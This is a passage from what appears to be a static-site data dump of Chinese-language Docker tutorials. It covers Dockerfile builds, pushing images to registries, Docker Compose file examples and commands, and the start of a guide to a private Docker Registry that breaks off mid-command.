8081\n# 时区\nenv tz=asia/shanghai\nrun ln -snf /usr/share/zoneinfo/$tz /etc/localtime && echo $tz > /etc/timezone\n# 添加应用\nadd ./target/tool-boot-0.0.1-snapshot.jar /server/tool-boot.jar\n# 创建一个工作目录，并将外部配置文件复制到镜像中\nrun mkdir /server/config\ncopy /src/main/resources/application.yml /app/config/\nworkdir /server\n## 在镜像运行为容器后执行的命令\nentrypoint java -jar -dpolyglot.engine.warninterpreteronly=false tool-boot.jar  $params\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n执行命令\n\n#build 构建应用的镜像\ndocker build -f ./dockerfile -t 875730567/easy-manager-tool .\n\n\n1\n2\n\n\n运行容器\n\n#build 构建应用的镜像\ndocker run -p 8081:8081 --name -v /opt:/server/config easy-manager-tool -d 875730567/easy-manager-tool\n\n\n1\n2\n\n\n\n# 5. docker 使用阿里云仓库或自建仓库\n\n\n# 阿里云仓库\n\n 1. 先登录阿里云镜像服务，地址\n 2. 创建个人或企业实例\n 3. 创建镜像仓库，这个仓库可以建多个，看自己\n 4. 创建完毕之后可以根据阿里云提供的步骤进行推送或拉取\n\n\n\n如果我们只是想用阿里云的镜像加速器，可以找到如下图操作即可。\n\n\n\n\n# 自建仓库\n\n 1. 拉取仓库镜像\n\ndocker pull registry\n\n\n1\n\n 2. 运行镜像\n\ndocker run -d -v /edc/images/registry:/var/lib/registry \n-p 5000:5000 \n--restart=always \n--name xdp-registry registry\n\n\n1\n2\n3\n4\n\n 3. 查看镜像信息\n\ncurl http://127.0.0.1:5000/v2/_catalog\n\n\n1\n\n\n\n# 6. 上传 dockerhub\n\n 1. 首先保证你登录\n\ndocker login --username=xxxx\n\n\n1\n\n 2. 构建镜像\n\ndocker build -t 账号/应用名称 -f dockerfile .\n\n\n1\n\n 3. 在 dockerhub 新建仓库 https://hub.docker.com/\n 4. 给镜像打一个 tag 标签\n\ndocker tag 账号/应用名称 账号/标签名称:标签版本\n\n\n1\n\n 5. 上传\n\ndocker push 账号/标签名称:标签版本\n\n\n1\n',charsets:{cjk:!0}},{title:"Docker-Compose 命令及基本使用",frontmatter:{title:"Docker-Compose 命令及基本使用",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/401",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/40.Docker/401.Docker-Compose%20%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html",relativePath:"01.运维/40.Docker/401.Docker-Compose 命令及基本使用.md",key:"v-12a39364",path:"/docker/401/",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:2},{level:2,title:"安装与卸载",slug:"安装与卸载",normalizedTitle:"安装与卸载",charIndex:638},{level:2,title:"命令",slug:"命令",normalizedTitle:"命令",charIndex:503},{level:2,title:"Compose文件编写",slug:"compose文件编写",normalizedTitle:"compose 文件编写",charIndex:1790},{level:3,title:"示例1",slug:"示例1",normalizedTitle:"示例 1",charIndex:1807},{level:3,title:"示例2",slug:"示例2",normalizedTitle:"示例 2",charIndex:3203},{level:3,title:"Compose 指令",slug:"compose-指令",normalizedTitle:"compose 指令",charIndex:5784},{level:3,title:"命令选项",slug:"命令选项",normalizedTitle:"命令选项",charIndex:5952},{level:3,title:"命令使用说明",slug:"命令使用说明",normalizedTitle:"命令使用说明",charIndex:6176},{level:4,title:"up",slug:"up",normalizedTitle:"up",charIndex:2309},{level:4,title:"down",slug:"down",normalizedTitle:"down",charIndex:809},{level:4,title:"exec",slug:"exec",normalizedTitle:"exec",charIndex:6686},{level:4,title:"ps",slug:"ps",normalizedTitle:"ps",charIndex:769},{level:4,title:"restart",slug:"restart",normalizedTitle:"restart",charIndex:6824},{level:4,title:"rm",slug:"rm",normalizedTitle:"rm",charIndex:6925},{level:4,title:"start",slug:"start",normalizedTitle:"start",charIndex:6826},{level:4,title:"stop",slug:"stop",normalizedTitle:"stop",charIndex:7013},{level:4,title:"top",slug:"top",normalizedTitle:"top",charIndex:666},{level:4,title:"pause,unpause",slug:"pause-unpause",normalizedTitle:"pause,unpause",charIndex:7337},{level:4,title:"logs",slug:"logs",normalizedTitle:"logs",charIndex:7464}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"简介 安装与卸载 命令 Compose文件编写 示例1 示例2 Compose 指令 命令选项 命令使用说明 up down exec ps restart rm start stop top pause,unpause logs",content:'# 简介\n\nCompose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排，帮助定义和运行多个 Docker 容器的应用，其前身是开源项目 Fig。所谓编排就是能把一个项目的依赖（如 mysql，redis，服务间的依赖等）按照有序的方式启动容器\n\nDockerFile 可以让用户很方便的定义一个单独的应用容器，然而在日常工作中们经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 web 项目，除了 web 服务容器本身，往往还需要再加上后端的数据库服务器容器，甚至还包括负载均衡容器等。\n\nCompose 恰好满足了这样的需求，它允许通过一个单独的 docker-compose.yml 模板文件，来定义一组相关联的应用容器为一个项目。\n\nCompose 中有两个重要的概念\n\n 1. 服务（service），一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。\n 2. 项目（project），由一组关联的应用容器组成的一个完整业务单元，再 docker-compose.yml 文件中定义。\n\nCompose 的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷地生命周期管理。\n\nCompose 项目由 Python 编写，实现上调用了 Docker 服务提供的 API 来对容器进行管理。因此，只要所操作的平台支持 Docker API，就可以再其上利用 Compose 来进行编排管理。\n\n\n# 安装与卸载\n\n安装的话，可以安装 Docker Desktop ，它包含了 Docker 以及 Compose 和 K8s，也可以单独安装，但建议先了解清楚官方对 Compose 的一些安装限制。官方地址\n\nlinux 安装\n\nsudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n\n\n1\n2\n3\n\n\n\n# 命令\n\n命令            描述\nversion       版本目前 4 以下的都可以写，如 3.9，3.8 等，最好保持和 docker 版本兼容\nservices      可以里面描述你的所有服务，以及依赖关系等\nimage         指定为镜像名称或镜像 ID，如果镜像在本地不存在，Compose 将会尝试拉取这个镜像\nports         指定与宿主机与容器映射的端口，是一个数组，每个数组的元素建议用字符形式，如 "80:80"\nvolumes       挂载路径设置，类型为数组，可以挂载多个，在制作容器的时候可以显示的声明挂载路径，也可以在容器运行时直接使用 -v 命令。\nnetworks      配置容器连接的网络 docker network ls 查看网络列表， docker network inspect\n              <container id> 可以查看对应网络的配置\nenvironment   设置环境变量。你可以使用数组或字典两种方式\nenv_file      从文件中获取环境变量，可以为单独的文件路径或列表，文件内必须是字典方式编写\ncommand       覆盖容器启动后默认执行的命令\ndepends_on    解决容器的依赖、启动先后的问题，填写的值为 服务名，会等依赖的服务启动一定程度才启动自己\nhealthcheck   通过命令检查容器是否监控运行\nsysctls       配置容器内核参数，如 ES 等都需要修改内核的环境参数\nulimits       指定容器的 ulimits 限制值，如 ES、Clickhouse 会有修改需求\nbuild         用来将指定 Dockerfile 打包成对应镜像，然后再运行该镜像\n\n这些命令其实就类似于我们在 Docker 中启动一个容器的命令。\n\n\n# Compose 文件编写\n\n\n# 示例 1\n\n### 版本\nversion: "3.2"\n\nservices:\n  ### 服务名称\n  tomcat:\n    ### 指定容器的名称 相当于 --name\n    container_name: tomcat_1\n    ### 使用哪个镜像 相当于 docket run image\n    image: tomcat:8.0-jre8\n    ### 指定宿主机与容器端口的映射 相当于 -p\n    ports:\n      ### 宿主机:容器\n      - "8080:8080"\n    ### 宿主机与容器的数据共享 挂载目录 相当于 -v\n    volumes:\n      ### 方式1：指定绝对明确(绝对路径)的挂载目录\n      - /home/server:/user\n      ### 方式2：声明了自定创建卷名的变量\n      - tomcatwebapps:/user\n    ### 代表当前服务处于那个网络，作用是网络隔离用，会把相网络名称相同的容器的网段统一。相当于 --network\n    networks:\n      - group1\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n    - "3306:3306"\n    volumes:\n    - mysqldata:/var/lib/mysql\n    - mysqlconf:/etc/mysql\n    environment:\n      -MYSQL_ROOT_PASSWORD=root\n    networks:\n      group1\n\n\n### 描述 挂在卷里的变量\nvolumes:\n  ### 指定变量 tomcatwebapps，如果不写 external，默认会是 docker-compose.yml 所在当前文件夹的名称(会自动创建)\n  tomcatwebapps:\n    ### 使用自定义卷毛\n    external:\n      ### true 确定使用指定卷名，注意：一旦使用外部自定义卷名，启动服务之前必须手动创建 docker volume create 卷名\n      false\n  mysqldata:\n  mysqlconf:\n\n### 定义服务用到的网络\nnetworks:\n  ### 定义上面的服务用到的网络的名称，默认是驱动属于 bridge，自定义的网络名称 group1，在实际中会变为 项目名(或所在文件目录名)\n  group1:\n    ### 使用外部指定的网络，为 true 就标识网络必须存在\n    external:\n      ### docker network create -d bridge 网络名称\n      true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n\n# 示例 2\n\n### 指定版本，版本的关系和Docker 引擎有关\n### https://docs.docker.com/compose/compose-file/compose-file-v3/#profiles 版本关系及说明\nversion: \'3.7\'\n\n### 指定服务\nservices:\n  ### 服务名称 唯一\n  monitor-web-server-service:\n    ### 构建镜像的项目路径\n    build:\n      ### 指定上下文路径，默认是微服务项目的根目录\n      context: ./monitor-web/monitor-web-server/\n      ### 指定\n      dockerfile: monitor-web-server-service\n    ### 指定镜像名称\n    image: monitor-web-server-service\n    ### .env的环境变量\n    env_file:\n      - ./.env\n    ### 网络配置\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-web-socket-service:\n    build: ./monitor-web/monitor-web-socket/monitor-web-socket-service\n    image: boboweike/monitor-web-socket-service\n    env_file:\n      - ./.env\n    ### 依赖的项目，启动的时候根据依赖关系定义启动顺序\n    depends_on:\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-gateway:\n    build: ./monitor-gateway\n    image: boboweike/monitor-gateway\n    ### 设置内部和外部端口\n    ports:\n    - 80:80\n    env_file:\n      - ./.env\n    ### 依赖的项目，启动的时候根据依赖关系定义启动顺序\n    depends_on:\n      - monitor-web-server-service\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access\n    ### 心跳检查\n    healthcheck:\n      ### 访问 monitor-gateway 网关的命令\n      test: [ "CMD","curl","-f","http://localhost:80" ]\n      ### 间隔时间\n      interval: 1m30s\n      ### 超时时间\n      timeout: 10s\n      ### 重试次数\n      retries: 3\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - mysqldata:/var/lib/mysql\n      - mysqlconf:/etc/mysql\n    env_file:\n      - ./mysql.env\n    networks:\n      - external_access\n    ### 修改内核参数，也可以是数组的方式\n    sysctls:\n      net.core.somaxconn: 1024\n      net.ipv4.tcp_syncookies: 0\n    ### 指定容器的 ulimits 限制值，例如 ，\n    ulimits:\n      ### 指定最大进程数为 65535\n      nproc: 65535\n      ### 指定文件句柄数为\n      nofile:\n        ### 软限制 200000（软限制，应用可以随时修改，不能超过硬限制）\n        soft: 20000\n        ### 硬限制（系统硬限制，只能root用户提高）\n        hard: 40000\n\n\n  myaccount-service:\n    build:\n      context: ./frontend\n      dockerfile: myaccount/Dockerfile\n    image: boboweike/myaccount-spa\n    networks:\n      - internal_access\n\n\nnetworks:\n  internal_access:\n    internal: true\n  external_access:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n\n\n\n# Compose 指令\n\n对于 Compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到影响。\n\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n\n\n1\n\n\n\n# 命令选项\n\n * -f -> --file FILE 指定使用的 Compose 模板把文件，默认为 docker-compose.yml，可以多次指定。\n * -p -> --project-name NAME 指定项目名称，默认将使用所在目录名称作为项目名\n * --x-networking 使用 Docker 可插拔网络后端特性\n * --verbose 输出更多调试信息。\n * -v -> --version 打印版本并退出。\n\n\n# 命令使用说明\n\n# up\n\ndocker-compose up [options] [SERVICE...]\n\n\n1\n\n * 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。\n * 连接的服务都将会被自动启动，除非已经处于运行状态\n * 大部分的时候都可以直接通过该命令来启动一个项目。\n * 默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。\n * 当通过 Ctrl-c 停止命令时，所有容器将会停止\n * 如果使用 docker-compose up -d，将会再后台启动并运行所有的容器，一般推荐生产环境下使用该选项。\n * 默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容。\n\n# down\n\ndocker-compose down\n\n\n1\n\n\n此命令将会停止 up 命令所启动的容器，并移除网络\n\n# exec\n\ndocker-compose exec 服务名\n\n\n1\n\n\n进入指定的容器\n\n# ps\n\ndocker-compose ps [options] [SERVICE...]\n\n\n1\n\n\n列出项目中目前的所有容器。\n\n * -q ，可以以打印容器的 ID 信息\n\n# restart\n\ndocker-compose restart [options] [service...]\n\n\n1\n\n\n重启项目中的服务，选项 -t 指定重启前停止容的超时时间（默认 10s）\n\n# rm\n\ndocker-compose rm [options] [service...]\n\n\n1\n\n\n删除所有（停止状态的）服务容器。推荐先执行 docker-compose stop 命令来停止容器。\n\n * -f 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。\n * -v 删除容器所挂载的数据卷。\n\n# start\n\ndocker-compose start [service...]\n\n\n1\n\n\n启动已经存在的服务容器\n\n# stop\n\ndocker-compose stop [options] [service...]\n\n\n1\n\n\n停止已经处于运行状态的容器，但不删除它。通过 docker-compose start 可以再次启动这些容器\n\n * -t 停止容器的超时时间（默认为 10s）\n\n# top\n\ndocker-compose top\n\n\n1\n\n\n查看各个服务容器内运行的进程。\n\n# pause,unpause\n\ndocker-compose pause [service...]\n\n\n1\n\n\n暂停处于运行中的服务。\n\ndocker-compose unpause [service...]\n\n\n1\n\n\n恢复处于暂停状态中的服务。\n\n# logs\n\ndocker-compose logs [service...]\n\n\n1\n\n\n查看某个服务的日志',normalizedContent:'# 简介\n\ncompose 项目是 docker 官方的开源项目，负责实现对 docker 容器集群的快速编排，帮助定义和运行多个 docker 容器的应用，其前身是开源项目 fig。所谓编排就是能把一个项目的依赖（如 mysql，redis，服务间的依赖等）按照有序的方式启动容器\n\ndockerfile 可以让用户很方便的定义一个单独的应用容器，然而在日常工作中们经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 web 项目，除了 web 服务容器本身，往往还需要再加上后端的数据库服务器容器，甚至还包括负载均衡容器等。\n\ncompose 恰好满足了这样的需求，它允许通过一个单独的 docker-compose.yml 模板文件，来定义一组相关联的应用容器为一个项目。\n\ncompose 中有两个重要的概念\n\n 1. 服务（service），一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。\n 2. 项目（project），由一组关联的应用容器组成的一个完整业务单元，再 docker-compose.yml 文件中定义。\n\ncompose 的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷地生命周期管理。\n\ncompose 项目由 python 编写，实现上调用了 docker 服务提供的 api 来对容器进行管理。因此，只要所操作的平台支持 docker api，就可以再其上利用 compose 来进行编排管理。\n\n\n# 安装与卸载\n\n安装的话，可以安装 docker desktop ，它包含了 docker 以及 compose 和 k8s，也可以单独安装，但建议先了解清楚官方对 compose 的一些安装限制。官方地址\n\nlinux 安装\n\nsudo curl -l "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n\n\n1\n2\n3\n\n\n\n# 命令\n\n命令            描述\nversion       版本目前 4 以下的都可以写，如 3.9，3.8 等，最好保持和 docker 版本兼容\nservices      可以里面描述你的所有服务，以及依赖关系等\nimage         指定为镜像名称或镜像 id，如果镜像在本地不存在，compose 将会尝试拉取这个镜像\nports         指定与宿主机与容器映射的端口，是一个数组，每个数组的元素建议用字符形式，如 "80:80"\nvolumes       挂载路径设置，类型为数组，可以挂载多个，在制作容器的时候可以显示的声明挂载路径，也可以在容器运行时直接使用 -v 命令。\nnetworks      配置容器连接的网络 docker network ls 查看网络列表， docker network inspect\n              <container id> 可以查看对应网络的配置\nenvironment   设置环境变量。你可以使用数组或字典两种方式\nenv_file      从文件中获取环境变量，可以为单独的文件路径或列表，文件内必须是字典方式编写\ncommand       覆盖容器启动后默认执行的命令\ndepends_on    解决容器的依赖、启动先后的问题，填写的值为 服务名，会等依赖的服务启动一定程度才启动自己\nhealthcheck   通过命令检查容器是否监控运行\nsysctls       配置容器内核参数，如 es 等都需要修改内核的环境参数\nulimits       指定容器的 ulimits 限制值，如 es、clickhouse 会有修改需求\nbuild         用来将指定 dockerfile 打包成对应镜像，然后再运行该镜像\n\n这些命令其实就类似于我们在 docker 中启动一个容器的命令。\n\n\n# compose 文件编写\n\n\n# 示例 1\n\n### 版本\nversion: "3.2"\n\nservices:\n  ### 服务名称\n  tomcat:\n    ### 指定容器的名称 相当于 --name\n    container_name: tomcat_1\n    ### 使用哪个镜像 相当于 docket run image\n    image: tomcat:8.0-jre8\n    ### 指定宿主机与容器端口的映射 相当于 -p\n    ports:\n      ### 宿主机:容器\n      - "8080:8080"\n    ### 宿主机与容器的数据共享 挂载目录 相当于 -v\n    volumes:\n      ### 方式1：指定绝对明确(绝对路径)的挂载目录\n      - /home/server:/user\n      ### 方式2：声明了自定创建卷名的变量\n      - tomcatwebapps:/user\n    ### 代表当前服务处于那个网络，作用是网络隔离用，会把相网络名称相同的容器的网段统一。相当于 --network\n    networks:\n      - group1\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n    - "3306:3306"\n    volumes:\n    - mysqldata:/var/lib/mysql\n    - mysqlconf:/etc/mysql\n    environment:\n      -mysql_root_password=root\n    networks:\n      group1\n\n\n### 描述 挂在卷里的变量\nvolumes:\n  ### 指定变量 tomcatwebapps，如果不写 external，默认会是 docker-compose.yml 所在当前文件夹的名称(会自动创建)\n  tomcatwebapps:\n    ### 使用自定义卷毛\n    external:\n      ### true 确定使用指定卷名，注意：一旦使用外部自定义卷名，启动服务之前必须手动创建 docker volume create 卷名\n      false\n  mysqldata:\n  mysqlconf:\n\n### 定义服务用到的网络\nnetworks:\n  ### 定义上面的服务用到的网络的名称，默认是驱动属于 bridge，自定义的网络名称 group1，在实际中会变为 项目名(或所在文件目录名)\n  group1:\n    ### 使用外部指定的网络，为 true 就标识网络必须存在\n    external:\n      ### docker network create -d bridge 网络名称\n      true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n\n# 示例 2\n\n### 指定版本，版本的关系和docker 引擎有关\n### https://docs.docker.com/compose/compose-file/compose-file-v3/#profiles 版本关系及说明\nversion: \'3.7\'\n\n### 指定服务\nservices:\n  ### 服务名称 唯一\n  monitor-web-server-service:\n    ### 构建镜像的项目路径\n    build:\n      ### 指定上下文路径，默认是微服务项目的根目录\n      context: ./monitor-web/monitor-web-server/\n      ### 指定\n      dockerfile: monitor-web-server-service\n    ### 指定镜像名称\n    image: monitor-web-server-service\n    ### .env的环境变量\n    env_file:\n      - ./.env\n    ### 网络配置\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-web-socket-service:\n    build: ./monitor-web/monitor-web-socket/monitor-web-socket-service\n    image: boboweike/monitor-web-socket-service\n    env_file:\n      - ./.env\n    ### 依赖的项目，启动的时候根据依赖关系定义启动顺序\n    depends_on:\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-gateway:\n    build: ./monitor-gateway\n    image: boboweike/monitor-gateway\n    ### 设置内部和外部端口\n    ports:\n    - 80:80\n    env_file:\n      - ./.env\n    ### 依赖的项目，启动的时候根据依赖关系定义启动顺序\n    depends_on:\n      - monitor-web-server-service\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access\n    ### 心跳检查\n    healthcheck:\n      ### 访问 monitor-gateway 网关的命令\n      test: [ "cmd","curl","-f","http://localhost:80" ]\n      ### 间隔时间\n      interval: 1m30s\n      ### 超时时间\n      timeout: 10s\n      ### 重试次数\n      retries: 3\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - mysqldata:/var/lib/mysql\n      - mysqlconf:/etc/mysql\n    env_file:\n      - ./mysql.env\n    networks:\n      - external_access\n    ### 修改内核参数，也可以是数组的方式\n    sysctls:\n      net.core.somaxconn: 1024\n      net.ipv4.tcp_syncookies: 0\n    ### 指定容器的 ulimits 限制值，例如 ，\n    ulimits:\n      ### 指定最大进程数为 65535\n      nproc: 65535\n      ### 指定文件句柄数为\n      nofile:\n        ### 软限制 200000（软限制，应用可以随时修改，不能超过硬限制）\n        soft: 20000\n        ### 硬限制（系统硬限制，只能root用户提高）\n        hard: 40000\n\n\n  myaccount-service:\n    build:\n      context: ./frontend\n      dockerfile: myaccount/dockerfile\n    image: boboweike/myaccount-spa\n    networks:\n      - internal_access\n\n\nnetworks:\n  internal_access:\n    internal: true\n  external_access:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n\n\n\n# compose 指令\n\n对于 compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到影响。\n\ndocker-compose [-f=<arg>...] [options] [command] [args...]\n\n\n1\n\n\n\n# 命令选项\n\n * -f -> --file file 指定使用的 compose 模板把文件，默认为 docker-compose.yml，可以多次指定。\n * -p -> --project-name name 指定项目名称，默认将使用所在目录名称作为项目名\n * --x-networking 使用 docker 可插拔网络后端特性\n * --verbose 输出更多调试信息。\n * -v -> --version 打印版本并退出。\n\n\n# 命令使用说明\n\n# up\n\ndocker-compose up [options] [service...]\n\n\n1\n\n * 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。\n * 连接的服务都将会被自动启动，除非已经处于运行状态\n * 大部分的时候都可以直接通过该命令来启动一个项目。\n * 默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。\n * 当通过 ctrl-c 停止命令时，所有容器将会停止\n * 如果使用 docker-compose up -d，将会再后台启动并运行所有的容器，一般推荐生产环境下使用该选项。\n * 默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容。\n\n# down\n\ndocker-compose down\n\n\n1\n\n\n此命令将会停止 up 命令所启动的容器，并移除网络\n\n# exec\n\ndocker-compose exec 服务名\n\n\n1\n\n\n进入指定的容器\n\n# ps\n\ndocker-compose ps [options] [service...]\n\n\n1\n\n\n列出项目中目前的所有容器。\n\n * -q ，可以以打印容器的 id 信息\n\n# restart\n\ndocker-compose restart [options] [service...]\n\n\n1\n\n\n重启项目中的服务，选项 -t 指定重启前停止容的超时时间（默认 10s）\n\n# rm\n\ndocker-compose rm [options] [service...]\n\n\n1\n\n\n删除所有（停止状态的）服务容器。推荐先执行 docker-compose stop 命令来停止容器。\n\n * -f 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。\n * -v 删除容器所挂载的数据卷。\n\n# start\n\ndocker-compose start [service...]\n\n\n1\n\n\n启动已经存在的服务容器\n\n# stop\n\ndocker-compose stop [options] [service...]\n\n\n1\n\n\n停止已经处于运行状态的容器，但不删除它。通过 docker-compose start 可以再次启动这些容器\n\n * -t 停止容器的超时时间（默认为 10s）\n\n# top\n\ndocker-compose top\n\n\n1\n\n\n查看各个服务容器内运行的进程。\n\n# pause,unpause\n\ndocker-compose pause [service...]\n\n\n1\n\n\n暂停处于运行中的服务。\n\ndocker-compose unpause [service...]\n\n\n1\n\n\n恢复处于暂停状态中的服务。\n\n# logs\n\ndocker-compose logs [service...]\n\n\n1\n\n\n查看某个服务的日志',charsets:{cjk:!0}},{title:"Docker私有库的开发",frontmatter:{title:"Docker私有库的开发",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/402",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/40.Docker/402.Docker%E7%A7%81%E6%9C%89%E5%BA%93%E7%9A%84%E5%BC%80%E5%8F%91.html",relativePath:"01.运维/40.Docker/402.Docker私有库的开发.md",key:"v-6ee475a8",path:"/docker/402/",headers:[{level:2,title:"准备",slug:"准备",normalizedTitle:"准备",charIndex:721},{level:3,title:"config.yml",slug:"config-yml",normalizedTitle:"config.yml",charIndex:1001},{level:2,title:"使用 Docker Registry",slug:"使用-docker-registry",normalizedTitle:"使用 docker registry",charIndex:6398},{level:2,title:"访问 Registry API",slug:"访问-registry-api",normalizedTitle:"访问 registry api",charIndex:6773}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"准备 config.yml 使用 Docker Registry 访问 Registry API",content:'正常来说我们使用别人的私有库就足够了，比如使用 Harbor，它可以帮我们很好的管理 docker，以及部署为私有或公有库给企业或其他人使用，如果想开发一套那么需要了解 docker 相关的 API，其中 dockerAPI 分为如下三部分：\n\n * Docker Engine API：Docker Engine API 是 Docker 引擎的 API 接口，用于与 Docker 引擎进行通信和管理。通过 Docker Engine API，可以管理容器、镜像、网络、卷等 Docker 相关资源。可以使用 Docker Engine API 创建、启动、停止和删除容器，构建和推送镜像，以及进行容器和镜像的管理和监控。\n * Docker Hub API：Docker Hub API 是与 Docker Hub 交互的 API 接口。Docker Hub 是一个公共的 Docker 镜像仓库，用于存储和分享 Docker 镜像。Docker Hub API 允许用户通过 API 接口与 Docker Hub 进行交互，可以搜索、下载、上传和删除镜像，管理仓库、标签和组织等\n * Registry API：Registry API 是与 Docker Registry 进行交互的 API 接口。Docker Registry 是一个私有的 Docker 镜像仓库，可以自己搭建和管理。Registry API 允许用户通过 API 接口与私有的 Docker Registry 进行交互，可以上传、下载和删除镜像，管理仓库和标签等\n\n没错，如果需要建立自己的 docker 私有库就要用到 Registry API。\n\n\n# 准备\n\n要在本地搭建私有的 Docker Registry，您可以按照以下步骤进行操作：\n\n 1. 确保已经安装 Docker，若还没有，您可以从 Docker 官方网站（https://www.docker.com/）下载并安装适用于您的操作系统的 Docker 版本。\n 2. 配置 Docker Registry：接下来，您需要创建并配置 Docker Registry。可以按照以下步骤进行配置：\n    * 创建一个存储 Registry 数据的目录。例如，您可以创建一个名为 /var/lib/registry 的目录。\n    * 创建一个名为 config.yml 的配置文件，并在其中指定 Registry 的配置选项。例如，您可以指定 Registry 监听在 5000 端口上，并允许匿名访问。（具体见下面 config 配置讲解）\n 3. 为 Docker Registry API 提前配置\n    先进行配置，去 /etc/docker/daemon.json 添加如下一句，最好是宿主机的 IP， 不要使用 127.0.0.1 ，我这里是方便测试，不使用宿主机 IP，会造成在使用 Docker Engine API 报 HTTPS 错误。\n\n{\n  "insecure-registries": ["127.0.0.1:5000"]\n}\n\n\n1\n2\n3\n\n\n配置完成后需要重新启动 Docker\n\nsudo systemctl restart docker\n\n\n1\n\n 4. 启动 Registry 容器：使用以下命令在本地启动 Registry 容器，官方文档 https://docs.docker.com/registry/deploying/?_gl=11ytdheb_gaODY2NTEyNi4xNjkyMDAxODU2_ga_XJWPQMJYHQ*MTY5Mzk5NzEyNy4yNS4xLjE2OTM5OTcyMTAuNTMuMC4w#native-basic-auth\n\ndocker run -d -p 5000:5000 --restart=always --name registry -v /opt/software/dockerRegistry:/var/lib/registry -v /opt/software/dockerRegistry/config.yml:/etc/docker/registry/config.yml 